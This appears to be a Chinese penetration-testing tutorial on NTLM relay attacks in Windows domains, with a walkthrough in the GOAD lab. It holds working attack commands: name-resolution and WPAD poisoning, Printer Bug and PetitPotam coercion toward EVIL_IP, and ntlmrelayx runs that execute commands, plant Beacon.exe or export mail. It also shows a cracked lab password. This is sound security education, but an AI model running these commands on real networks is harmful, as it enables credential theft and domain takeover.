---
title: 内网渗透(八)：中继攻击
url: https://mp.weixin.qq.com/s/qjR11oWaxlRQlCSeVEwssw
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:34:51.186563
---

# 内网渗透(八)：中继攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdW7ogjuogKjWF1ZUMvicpD4ia7e5tPD3HQaX8ywPMoajzJ0iaUHLYdGDWsw/0?wx_fmt=jpeg)

# 内网渗透(八)：中继攻击

JJ1ng
JJ1ng

JJ1ng

![]()

在小说阅读器中沉浸阅读

# 0x00 简介

本章节主要介绍 NTLM 中继相关的内容。个人才疏学浅，有未阐述清楚或遗漏的地方，可自行搜索相关资料参考学习。

主要内容：中继攻击的原理及各类利用手法，包括：SMB、HTTP、LDAP、MSSQL、DHCP 等，以及 GOAD 靶场演示。

---

中继攻击（Relay attacks），也可叫做 NTLM 中继攻击，其核心在于**接收**和**转发**。通过接收受害者的 Hash 凭证，并转发给其他主机，以此来伪造受害者身份，是一种中间人攻击（Man-in-the-Middle Attack，简称 MITM）。

NTLM 中继发生在 NTLM 认证的第三步，也就是发生在 Client 发送 `Response` 给 Server 的过程中，攻击者通过捕获受害者 `Response` 中的 `Net-NTLM Hash` 并将其重放，以伪造受害者身份访问其他主机上的资源，所以严格来说应该叫做 `Net-NTLM Hash` 中继攻击。注：协议具体可回顾**《内网渗透(二)：认证协议》**篇章。

## 1. LLMNR&NBNS

LLMNR（Link-Local Multicast Name Resolution， 链路本地多播名称解析），主要作用是在 DNS 服务器不可用或解析失败时，允许同一本地链路内的计算机通过“多播”的方式来寻找对方的主机名。注：只有运行 LLMNR 服务的主机才会进行响应。

NBT-NS（NetBIOS Name Service，网络基本输入输出系统名称服务），主要作用是在 DNS 解析不可用或 LLMNR 无法提供支持时，允许同一子网内的计算机通过“广播”的方式，将 NetBIOS 名称解析为对应的 IP 地址。

解析主机名的先后顺序，如下：

1. 本地 DNS 缓存
2. 本地 hosts 文件
3. DNS 服务器
4. LLMNR & NBNS 解析

## 2. 工具推荐

https://github.com/lgandx/Responder

https://github.com/fortra/impacket

https://github.com/dirkjanm/mitm6

https://github.com/Kevin-Robertson/Inveigh

https://github.com/Hackndo/lsassy

https://github.com/p0dalirius/Coercer

# 0x01 中继攻击

---

中继攻击分为两步，**捕获**（Capture）和**重放**（Relay），且根据环境的不同，可分为两种情况：工作组和域环境。

在工作组环境下，由于主机间没有信任关系，所以中继攻击成功的前提，需要不同主机间的密码相同，同 PTH 利用方式一致。但可以中继到受害者本身，危害较大，已在 KB957097 补丁进行了修复；但在后来的 CVE-2019-1384（Ghost Potato）绕过了该补丁。

```
# 绕过 KB957097 补丁，实现中继到自身，并上传 Beacon.exe 至目标启动文件夹中
impacket-ntlmrelayx -t IP -smb2support --gpotato-startup Beacon.exe
```

域环境下，普通域用户可以登录除域控外的其他所有机器（但一般会被限制只能登录当前主机），因此可以将 `Net-NTLM Hash` 进行重放实现中继攻击。此外，还可通过破解 `Net-NTLM Hash` 来进行后利用，具体可查看《内网渗透(七)：凭证攻击》篇章的内容。注：如下都是以域环境作为演示。

## 1. Capture

开展 NTLM 中继前，第一步就是捕获 `Net-NTLM Hash`，对于捕获而言，关键问题在于“如何让受害者向攻击者发起 NTLM 认证”。守株待兔的方式不可取，更有效的做法应该是可以通过某种方式让受害者能不经意间触发 NTLM 认证。常用的方式如下（由于篇幅的原因，不会全都进行介绍，具体可以参考给出的链接）：

* LLMNR&NBNS
* 执行系统命令
* 系统图标
* 修改用户头像
* 文件利用，包括：SCF、URL、RTF、XML、INI、INK、INF、M3U、PDF（利用工具有 Bad-PDF 和 Worse-PDF 等）、WORD 等
* Outlook
* WPAD
* 漏洞利用，包括：Web 漏洞、打印机漏洞、PetitPotam、DFSCoerce、ShadowCoerce 等
* ......

### 1.1 LLMNR&NBNS

攻击者可通过 `Responder` 工具来监听 `LLMNR` 和 `NBNS` 发出的“多播/广播”包，并声称自己就是其要访问的主机，且要求受害者进行 NTLM 认证，从而窃取受害者的 `Net-NTLM Hash`。该方式需要受害者访问一台不存在的主机。

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWLa0USADwoaeY8LLvEotI9Yc46Lu1iaib9ibzrTmRXu9Ufyy57w3RnH5XA/640?wx_fmt=png&from=appmsg)

### 1.2 WPAD

WPAD（Web Proxy Auto-Discovery Protocol，Web 代理自动发现协议），可使得局域网下的浏览器自动发现内网中的代理服务器，并使用其代理进行上网。其原理主要是通过 DHCP、DNS、LLMNR、NBNS 等协议实现的。参考链接：https://www.anquanke.com/post/id/94689

如此，可通过毒化 DHCP、DNS、LLMNR、NBNS 等协议来获取受害者的 `Net-NTLM Hash`。但由于后续对于 `MS16-077` 的修复措施，导致只能通过毒化 DHCP 和 DNS 来实现利用。

```
# 工具 responder，参数 -w 表示伪造 WPAD 服务器
responder -I eth0 -wd

# 工具 MITM6
mitm6 -i eth0 -d DOMAIN --debug
```

### 1.3 Printer Bug

通过 `Printer Bug` 漏洞可强制受害者向攻击者发起 NTLM 认证，这种方式可在受害者不知情的情况下进行利用，但前提需要域内用户的账号和密码。脚本地址：https://github.com/dirkjanm/krbrelayx

```
python printerbug.py DOMAIN/USER:PASS@CLIENT_IP EVIL_IP
```

### 1.4 PetitPotam

利用 `PetitPotam` 漏洞，可同样实现强制认证攻击。脚本地址：https://github.com/topotam/PetitPotam

```
python PetitPotam.py -u USER -p PASS -d DOMAIN EVIL_IP CLIENT_IP
```

## 2. Relay

成功捕获到 `Net-NTLM Hash` 后，第二步就是重放来伪造受害者身份。由于 NTLM 只是底层的认证协议，需要镶嵌在其他应用层协议之上来完成认证，如：SMB、HTTP、LDAP 等。因此，可将捕获的 `Net-NTLM Hash` 重放到其他使用 NTLM 协议进行认证的服务上。常见的三类目标：SMB、LDAP、HTTP。

下图中 `Client` 表示触发 NTLM 认证的主机；`Server` 表示要中继的主机。如下图的第一行，`Client` 通过 SMB 触发 NTLM 认证，并将其中继到 `Server` 的 SMBv1、SMBv2、HTTP、LDAP 服务。

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWVSOEa4PUs54gh0Yggv7IFbNicz18lI3icolf00oK8aRKcvkbchV7WhrA/640?wx_fmt=png&from=appmsg)
> 图出自：https://www.thehacker.recipes/ad/movement/ntlm/relay

### 2.1 Relay to SMB

SMB 中继攻击是指攻击者捕获用户发出的 `Net-NTLM Hash`，然后将其重放到其他禁用 SMB 签名的主机上（一般情况下，DC 默认开启 SMB 签名，其余域机器不开启）。

参考链接：https://www.cnblogs.com/kqdssheng/p/18904760

首先需判断哪些主机未开启 SMB 签名，以便后续进行中继利用。

```
# 工具 Nmap
nmap -p445 -Pn --script=smb-security-mode IP

# Responder 工具中的 RunFinger.py 脚本
responder-RunFinger -i IP

# 工具 NetExec
nxc smb IP
```

```
# 工具 impacket，将获取的 Hash 重放到指定的 IP
impacket-ntlmrelayx -t smb://IP -smb2support
impacket-ntlmrelayx -t IP -smb2support -c whoami

# 工具 responder
responder-MultiRelay -t IP -u ALL
responder-MultiRelay -t IP -u ALL -c whoami
```

---

在使用 `ntlmrelayx.py`、`MultiRelay.py` 这样的脚本时，需要受害者向攻击者发起 NTLM 认证，且 `responder` 没有重放的功能。

更有效的做法是结合 `responder` + `impacket-ntlmrelayx` 两款工具，`responder` 负责毒化网段内的 NTLM 认证请求，`impacket-ntlmrelayx` 负责伪造 SMB 服务并实现重放。

这里需要关闭 `responder` 监听时开启的 SMB 和 HTTP 服务，否者会和 `impacket-ntlmrelayx` 脚本产生端口冲突。修改 `responder.conf` 配置文件，默认位置：`/usr/share/responder`。

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdW25VYdmIAQV3JcLjFKeNVdoh4hVEiaJ7SvP5sLp1PQ96umFbm8dw1biag/640?wx_fmt=png&from=appmsg)

```
# 第一步，开启 responder 监听
responder -I eth0 -wd

# 第二步，通过 ntlmrelayx 伪造服务并进行重放
impacket-ntlmrelayx -t smb://IP -smb2support
impacket-ntlmrelayx -t smb://IP -smb2support -i
impacket-ntlmrelayx -t smb://IP -smb2support -e ./Beacon.exe

# 或者，使用 MultiRelay 脚本
responder-MultiRelay -t IP -u ALL
responder-MultiRelay -t IP -u ALL -c whoami
```

### 2.2 Relay to HTTP

Exchange 服务器提供的 `RPC`、`MAPI` 以及 `EWS` 接口都基于 HTTP 协议，且允许通过 NTLM 协议进行认证。因此，可以通过中继到 Exchange 服务器，来进行后利用。

工具链接：

https://github.com/Arno0x/NtlmRelayToEWS

https://github.com/quickbreach/ExchangeRelayX

```
# 脚本 ntlmRelayToEWS，中继到 Exchange 的 EWS 接口，并导出所有邮件
python2 ntlmRelayToEWS.py -t https://IP/EWS/exchange.asmx -r getFolder -f inbox -v
```

### 2.3 Relay to LDAP

从 HTTP 协议触发认证，中继到 LDAP 服务器，不要求签名；而从 SMB 协议到 LDAP，是强制要求签名，但可以通过 `CVE-2019-1040` 来绕过签名校验。

```
impacket-ntlmrelayx -t ldap://IP --no-dump
impacket-ntlmrelayx -t ldap://IP --remove-mic -smb2support
impacket-ntlmrelayx -t ldap://IP --remove-mic --delegate-access -smb2support
```

# 0x02 GOAD

---

如下通过 GOAD 靶场，来演示使用中继攻击获取 `Net-NTLM Hash`，以及实现接管域主机。参考链接：

https://xz.aliyun.com/news/11583

https://mayfly277.github.io/posts/GOADv2-pwning-part4/

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWOyzHCrU9LcMnQpKQ6YiaasJ7SXVvxmj1ZejF8FusgTy5sENhEK8Q3XQ/640?wx_fmt=png&from=appmsg)
> 图出自：https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg

## 1. Responder

GOAD 靶场中有两个程序分别模拟 `LLMRN`、`MDNS` 和 `NBT-NS` 请求。其中一个用户密码强度较低，没有管理员权限（robb.stark）；另一个用户拥有管理员权限（eddard.stark），但使用强密码。这里开启 `responder` 监听，几分钟后便可收到。

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdW6ia6K72Ob4zVzq4xDgZBShwS4MvvNicVfDQ9AnmuIkV0hJibcF8tzGKug/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWxxJWia0jgyS7J6Rydc7M3s9Ag019bmBQ7eDN9eiaCHV1icLpVtwbKeL7w/640?wx_fmt=png&from=appmsg)

通过 Hashcat 也是成功破解得到第五个凭证信息：`north.sevenkingdoms.local/robb.stark:sexywolfy`

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdW7MmS5bPzkbXEMhwGVzCwLHaz0aicT3qSmxur463wRjoQ6tG3Hq4abxw/640?wx_fmt=png&from=appmsg)

## 2. NTLM Relay

由于 `eddard.stark` 用户的密码强度高，这里没法进行破解。但可以通过将其中继到其他无需 SMB 签名的域主机上。首先来获取未启用 SMB 签名的主机。

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWypRVBia9BHrr54GpKLeFrlpVe0uQqQ4UfYCJDO4jjt82vnrsQZYr77w/640?wx_fmt=png&from=appmsg)

这里使用 `responder` + `ntlmrelayx` 的方式来进行中继攻击，根据前面的介绍，这里需要关闭 `responder` 监听时开启的 SMB 和 HTTP 服务。

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWgXnfsScJfl3Qqbu92dJKiaotBic5HAD3AcqcvDBzUaaX0RFbQIJ4eQMw/640?wx_fmt=png&from=appmsg)

```
# 开启 responder 监听
responder -I eth0 -wd

# 运行 ntlmrelayx 脚本，并通过代理来访问被中继的主机
impacket-ntlmrelayx -tf relay.txt  -of netntlm.hash -smb2support -socks
```

![](https://mmbiz.qpic.cn/mmbiz_png/G9w3J4rflFiaYqB1zdtGKFDiacbgyLdNdWk5ibHicc9Ucqz6LQXspm0rBibibM4ObhdoIjpytNiaImOpsBibOetn0n80yg/640?wx_fmt=png&from=appmsg)

通过 `responder` + `ntlmrelayx` 成功中继到 `192.168.56.22` 和 `192.168.56.23` 两台主机，并在本地 1080 端口设置了一个 socks 代理。由于 `eddard.stark` 是 `north.sevenkingdoms.local` 的域管理员，所以拥有导出本地以及 lsass 进程中凭证信息的权限。

```...